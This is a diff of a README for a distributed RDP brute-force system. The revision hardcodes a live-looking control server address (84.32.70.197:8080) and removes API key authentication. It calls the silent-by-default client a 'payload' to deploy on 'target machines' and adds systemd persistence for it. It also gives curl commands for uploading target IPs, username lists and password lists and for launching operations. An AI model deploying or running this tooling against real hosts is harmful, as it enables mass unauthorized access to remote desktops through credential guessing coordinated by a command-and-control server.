@@ -1,24 +1,23 @@
 # RDP Brute-Force Security Testing System
 
-A high-performance, distributed RDP brute-force system designed for security testing and penetration testing. This system implements advanced optimization techniques to achieve maximum efficiency while maintaining stability and reliability.
+A high-performance, distributed RDP brute-force system designed for security testing and penetration testing. This advanced system features embedded database deployment, real-time web dashboard, and optimized multithreading for maximum performance.
 
 ## System Architecture
 
 ### Overview
-The system consists of two main components:
-- **Server**: Manages clients, distributes work, tracks progress, and provides a web dashboard
-- **Clients**: Multi-threaded RDP checking engines with dynamic scaling and optimization
+The system consists of two separate executables:
+- **Server** (`rdp-server`): Main control panel with embedded SQLite database and web dashboard
+- **Client** (`rdp-client`): Standalone payload that connects workers to the server
 
 ### Key Features
-- **Real RDP Protocol Support**: Implements RDP protocol with NLA (Network Level Authentication) support
-- **Smart Work Distribution**: Prevents client idleness through predictive task allocation
-- **Dual-Buffer System**: Zero idle time through intelligent task buffering
-- **Work Stealing**: Automatic load balancing between clients
-- **Connection Caching**: Reuses connection information for improved performance
-- **Circuit Breakers**: Fault tolerance for failing targets
-- **Request Coalescing**: Reduces database load through intelligent batching
-- **Memory Pooling**: Minimizes GC pressure for sustained performance
-- **Real-time Dashboard**: Web-based monitoring and control interface
+- **Embedded Database**: Zero-config SQLite deployment with no external dependencies
+- **Single Executable Deployment**: Server includes embedded web dashboard and static assets
+- **Real NLA Authentication**: Complete NTLM/CredSSP implementation with TLS upgrade
+- **Adaptive Autoscaling**: Dynamic worker adjustment (50-500 threads) based on CPU cores and PPS
+- **Connection Optimization**: 10,000 cached connections with 5-minute TTL and session reuse
+- **Smart Work Distribution**: Predictive task allocation with load balancing and work stealing
+- **Real-time Dashboard**: Web-based monitoring with file uploads and live statistics
+- **Advanced Performance**: Connection pooling, batch processing, and circuit breakers
 
 ## Performance Benchmarks
 
@@ -36,15 +35,14 @@ Based on testing with optimized configuration:
 
 ### Server
 - CPU: 4+ cores recommended
-- RAM: 8GB minimum, 16GB recommended
-- Storage: SSD with 50GB+ free space
+- RAM: 4GB minimum, 8GB recommended
+- Storage: SSD with 10GB+ free space (embedded SQLite)
 - OS: Linux (Ubuntu 20.04+ recommended)
-- PostgreSQL 12+
-- Go 1.19+
+- Go 1.21+ (for building from source)
 
 ### Client
-- CPU: 2+ cores (more cores = more workers)
-- RAM: 2GB minimum
+- CPU: 2+ cores (autoscales: optimal = cores × 50, max = 500 workers)
+- RAM: 2GB minimum (scales with worker count)
 - Network: Stable internet connection
 - OS: Linux/Windows/macOS
 
@@ -52,127 +50,116 @@ Based on testing with optimized configuration:
 
 ### Prerequisites
 ```bash
-# Install Go
+# Install Go (for building from source)
 wget https://go.dev/dl/go1.21.0.linux-amd64.tar.gz
 sudo tar -C /usr/local -xzf go1.21.0.linux-amd64.tar.gz
-export PATH=$PATH:/usr/local/bin/go
-
-# Install PostgreSQL
-sudo apt update
-sudo apt install postgresql postgresql-contrib
-
-# Create database
-sudo -u postgres createdb rdpbrute
-sudo -u postgres psql -c "CREATE USER rdpuser WITH PASSWORD 'your_password';"
-sudo -u postgres psql -c "GRANT ALL PRIVILEGES ON DATABASE rdpbrute TO rdpuser;"
+export PATH=$PATH:/usr/local/go/bin
 ```
 
 ### Building from Source
 ```bash
 # Clone repository
-git clone https://github.com/yourusername/rdp-brute-system.git
+git clone https://github.com/Raroford32/rdp-brute-system.git
 cd rdp-brute-system
 
-# Build server
-go build -o rdp-server ./server/cmd/server
+# Build both executables
+./scripts/build.sh
 
-# Build client
-go build -o rdp-client ./client/cmd/client
+# Available executables:
+# bin/rdp-server - Server/Dashboard component with web interface
+# bin/rdp-client - Client payload that connects workers to server
+```
+
+### Quick Start
+```bash
+# 1. Start server (creates SQLite database automatically)
+./bin/rdp-server
+
+# 2. Connect clients from other machines
+./bin/rdp-client -server=84.32.70.197:8080 -threads=200
+
+# 3. Access web dashboard
+# Open browser: http://84.32.70.197:8080
 ```
 
 ## Configuration
 
 ### Server Configuration (.env)
 ```env
-# Database
-DATABASE_URL=postgres://rdpuser:password@localhost/rdpbrute?sslmode=disable
+# Database (SQLite - embedded)
+DB_PATH=./rdp_brute.db
 
 # Server
+SERVER_HOST=0.0.0.0
 SERVER_PORT=8080
-WS_PORT=8081
 
-# Performance
-MAX_DB_CONNECTIONS=100
-WORKER_POOL_SIZE=1000
-COALESCING_WINDOW_MS=10
-CIRCUIT_BREAKER_THRESHOLD=5
+# Logging
+LOG_DIR=./logs
+SILENT_MODE=true
 
-# Security
-API_KEY=your_secure_api_key
+# Performance History
+HISTORY_DATA_DIR=./data/history
 ```
 
-### Client Configuration
-```env
-# Server connection
-SERVER_URL=ws://server-ip:8081
-API_KEY=your_secure_api_key
+### Client Configuration (Command Line)
+```bash
+# Basic usage
+./bin/rdp-client -server=84.32.70.197:8080 -threads=200
 
-# Performance
-WORKER_THREADS=100
-BATCH_SIZE=500
-BUFFER_SIZE=1000
-
-# Timeouts
-CONNECTION_TIMEOUT=3s
-RDP_TIMEOUT=5s
+# Available flags:
+# -server string    Address of the control server (default "84.32.70.197:8080")
+# -threads int      Number of concurrent threads (default 200, max 500)
+# -silent bool      Run in silent mode (default true)
+# -logdir string    Directory for log files (default "./logs")
 ```
+
+### Autoscaling Configuration
+The client automatically adjusts worker threads based on:
+- **CPU cores**: Optimal workers = CPU cores × 50
+- **Performance**: Scale up at 300+ PPS, scale down at <50 PPS
+- **Bounds**: Minimum 50 workers, maximum 500 workers
+- **Intervals**: Scaling adjustments every 5 seconds
 
 ## Deployment
 
-### Docker Deployment (Recommended)
-
-```yaml
-# docker-compose.yml
-version: '3.8'
-
-services:
-  postgres:
-    image: postgres:14
-    environment:
-      POSTGRES_DB: rdpbrute
-      POSTGRES_USER: rdpuser
-      POSTGRES_PASSWORD: secure_password
-    volumes:
-      - postgres_data:/var/lib/postgresql/data
-    networks:
-      - rdp_network
-
-  server:
-    build:
-      context: .
-      dockerfile: Dockerfile.server
-    ports:
-      - "8080:8080"
-      - "8081:8081"
-    environment:
-      DATABASE_URL: postgres://rdpuser:secure_password@postgres/rdpbrute?sslmode=disable
-    depends_on:
-      - postgres
-    networks:
-      - rdp_network
-
-volumes:
-  postgres_data:
-
-networks:
-  rdp_network:
-```
-
-### Manual Deployment
+### Production Deployment
 
 1. **Server Setup**
 ```bash
-# Start PostgreSQL
-sudo systemctl start postgresql
+# Copy server binary to production server
+scp bin/rdp-server user@84.32.70.197:/opt/rdp-brute-system/
 
-# Run server
-./rdp-server
+# Start server (creates SQLite database automatically)
+./bin/rdp-server
+
+# Server will be available at:
+# Web Dashboard: http://84.32.70.197:8080
+# API Endpoint: http://84.32.70.197:8080/api
 ```
 
 2. **Client Deployment**
 ```bash
-# On each client machine
-./rdp-client -server ws://server-ip:8081 -key your_api_key
+# Deploy client payload to target machines
+scp bin/rdp-client user@client-machine:/opt/rdp-client
+
+# Start client with optimized settings
+./bin/rdp-client -server=84.32.70.197:8080 -threads=200
+
+# Client will automatically:
+# - Connect to server via HTTP REST API
+# - Register with server capabilities (200 max threads)
+# - Start autoscaling based on CPU cores and workload
+```
+
+### Distributed Deployment
+```bash
+# Server (single instance)
+./bin/rdp-server
+
+# Multiple clients (different machines)
+./bin/rdp-client -server=84.32.70.197:8080 -threads=200  # Machine 1
+./bin/rdp-client -server=84.32.70.197:8080 -threads=150  # Machine 2
+./bin/rdp-client -server=84.32.70.197:8080 -threads=300  # Machine 3
 ```
 
 ### Systemd Service (Production)
@@ -181,16 +168,36 @@ sudo systemctl start postgresql
 # /etc/systemd/system/rdp-server.service
 [Unit]
 Description=RDP Brute Force Server
-After=network.target postgresql.service
+After=network.target
 
 [Service]
 Type=simple
 User=rdpuser
 WorkingDirectory=/opt/rdp-brute-system
-ExecStart=/opt/rdp-brute-system/rdp-server
+ExecStart=/opt/rdp-brute-system/bin/rdp-server
 Restart=always
 RestartSec=10
-Environment="DATABASE_URL=postgres://rdpuser:password@localhost/rdpbrute"
+Environment="DB_PATH=/opt/rdp-brute-system/rdp_brute.db"
+Environment="SERVER_HOST=0.0.0.0"
+Environment="SERVER_PORT=8080"
+
+[Install]
+WantedBy=multi-user.target
+```
+
+```ini
+# /etc/systemd/system/rdp-client.service
+[Unit]
+Description=RDP Brute Force Client
+After=network.target
+
+[Service]
+Type=simple
+User=rdpuser
+WorkingDirectory=/opt/rdp-client
+ExecStart=/opt/rdp-client/bin/rdp-client -server=84.32.70.197:8080 -threads=200
+Restart=always
+RestartSec=10
 
 [Install]
 WantedBy=multi-user.target
@@ -198,43 +205,49 @@ WantedBy=multi-user.target
 
 ## Usage
 
-### Starting an Operation
+### Web Dashboard (Recommended)
+
+1. **Access Dashboard**
+```bash
+# Open browser and navigate to:
+http://84.32.70.197:8080
+```
+
+2. **Upload Files via Web Interface**
+- **Target IPs**: Upload `ips.txt` file with one IP per line
+- **Usernames**: Upload `users.txt` file with one username per line  
+- **Passwords**: Upload `passwords.txt` file with one password per line
+
+3. **Monitor Operations**
+- Real-time statistics (PPS, progress, success rate)
+- Connected clients and their performance
+- Live task distribution and completion
+- Successful authentication results
+
+### API Usage (Advanced)
 
 1. **Upload Target IPs**
 ```bash
-curl -X POST http://localhost:8080/api/ips \
-  -H "X-API-Key: your_api_key" \
+curl -X POST http://84.32.70.197:8080/api/ips \
   -F "file=@targets.txt"
 ```
 
 2. **Upload Credentials**
 ```bash
-curl -X POST http://localhost:8080/api/credentials \
-  -H "X-API-Key: your_api_key" \
+curl -X POST http://84.32.70.197:8080/api/credentials \
   -F "users=@usernames.txt" \
   -F "passwords=@passwords.txt"
 ```
 
 3. **Start Operation**
 ```bash
-curl -X POST http://localhost:8080/api/operations \
-  -H "X-API-Key: your_api_key" \
+curl -X POST http://84.32.70.197:8080/api/operations \
   -H "Content-Type: application/json" \
   -d '{
     "name": "Security Test 1",
     "description": "Testing network security"
   }'
 ```
-
-### Monitoring
-
-Access the web dashboard at `http://server-ip:8080`
-
-Features:
-- Real-time statistics (PPS, progress, success rate)
-- Client performance monitoring
-- Operation control (start/stop/pause/resume)
-- Result export
 
 ### API Endpoints
 
@@ -255,87 +268,87 @@ Features:
 
 ### Server Optimization
 
-1. **Database Tuning**
-```sql
--- Increase connection pool
-ALTER SYSTEM SET max_connections = 200;
-
--- Optimize for SSD
-ALTER SYSTEM SET random_page_cost = 1.1;
-
--- Increase shared buffers
-ALTER SYSTEM SET shared_buffers = '4GB';
-
--- Enable parallel queries
-ALTER SYSTEM SET max_parallel_workers_per_gather = 4;
-```
+1. **SQLite Optimization** (Automatic)
+- WAL mode enabled for concurrent access
+- Foreign keys enforced for data integrity
+- Shared cache for multiple connections
+- Optimized connection string with performance settings
 
 2. **System Tuning**
 ```bash
 # Increase file descriptors
 ulimit -n 65535
 
-# TCP tuning
+# TCP tuning for high connection loads
 sysctl -w net.core.somaxconn=65535
 sysctl -w net.ipv4.tcp_tw_reuse=1
 sysctl -w net.ipv4.ip_local_port_range="1024 65535"
+
+# Memory optimization
+sysctl -w vm.swappiness=10
 ```
 
 ### Client Optimization
 
-1. **Worker Thread Calculation**
+1. **Automatic Worker Thread Scaling**
 ```
-Optimal Workers = CPU Cores * 50
-Min Workers = 100
+Optimal Workers = CPU Cores × 50
+Min Workers = 50
 Max Workers = 500
+Scale Up Threshold = 300+ PPS
+Scale Down Threshold = <50 PPS
+Adjustment Interval = 5 seconds
 ```
 
-2. **Network Optimization**
-- Use connection pooling
-- Enable TCP keepalive
-- Implement exponential backoff
+2. **Connection Optimization** (Automatic)
+- Connection pooling: 10,000 cached connections
+- Connection TTL: 5 minutes
+- TLS session cache: 1,000 entries
+- Batch processing: 500 items per batch
+- Exponential backoff for failed connections
 
 ## Troubleshooting
 
 ### Common Issues
 
 1. **Low Performance**
-   - Check network latency
-   - Verify worker thread count
-   - Monitor CPU/memory usage
-   - Check database connection pool
+   - Check network latency to 84.32.70.197
+   - Verify client autoscaling is working (check logs)
+   - Monitor CPU/memory usage on client machines
+   - Ensure SQLite database is on SSD storage
 
-2. **Client Disconnections**
-   - Increase WebSocket timeout
-   - Check firewall settings
-   - Verify network stability
+2. **Client Connection Issues**
+   - Verify server is running on 84.32.70.197:8080
+   - Check firewall settings (port 8080 must be open)
+   - Test connectivity: `curl http://84.32.70.197:8080/health`
+   - Review client logs in `./logs/` directory
 
 3. **High Memory Usage**
-   - Reduce batch sizes
-   - Enable memory pooling
-   - Decrease worker count
+   - Reduce thread count: `-threads=100` instead of 200
+   - Check for memory leaks in logs
+   - Monitor autoscaling behavior
 
 ### Debug Mode
 
 ```bash
-# Enable debug logging
-./rdp-server -debug
+# Server with verbose logging
+./bin/rdp-server  # Check logs in ./logs/server.log
 
-# Client verbose mode
-./rdp-client -server ws://server:8081 -verbose
+# Client with verbose logging  
+./bin/rdp-client -server=84.32.70.197:8080 -threads=200 -silent=false
 ```
 
 ### Health Checks
 
 ```bash
-# Check system health
-curl http://localhost:8080/health
+# Check server health
+curl http://84.32.70.197:8080/health
 
-# Check readiness
-curl http://localhost:8080/health/ready
+# Get system metrics
+curl http://84.32.70.197:8080/api/stats
 
-# Get metrics
-curl http://localhost:8080/health/metrics
+# Check connected clients
+curl http://84.32.70.197:8080/api/clients
 ```
 
 ## Security Considerations
